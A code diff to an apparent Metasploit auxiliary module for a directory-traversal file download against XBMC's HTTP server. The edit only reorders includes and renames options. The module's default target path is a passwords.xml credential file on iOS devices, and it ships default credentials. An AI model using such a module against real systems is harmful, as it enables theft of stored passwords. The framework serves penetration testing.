@@ -9,9 +9,9 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Auxiliary::Scanner
 	include Msf::Auxiliary::Report
 	include Msf::Exploit::Remote::HttpClient
+	include Msf::Auxiliary::Scanner
 
 	def initialize(info={})
 		super(update_info(info,
@@ -41,11 +41,9 @@ class Metasploit3 < Msf::Auxiliary
 				Opt::RPORT(8080),
 				OptString.new('FILEPATH', [false, 'The name of the file to download', '/private/var/mobile/Library/Preferences/XBMC/userdata/passwords.xml']),
 				OptInt.new('DEPTH', [true, 'The max traversal depth', 9]),
-				OptString.new('USER', [true, 'The username to use for the HTTP server', 'xbmc']),
-				OptString.new('PASS', [true, 'The password to use for the HTTP server', 'xbmc']),
+				OptString.new('USERNAME', [true, 'The username to use for the HTTP server', 'xbmc']),
+				OptString.new('PASSWORD', [true, 'The password to use for the HTTP server', 'xbmc']),
 			], self.class)
-
-		deregister_options('RHOST')
 	end
 
 	def run_host(ip)
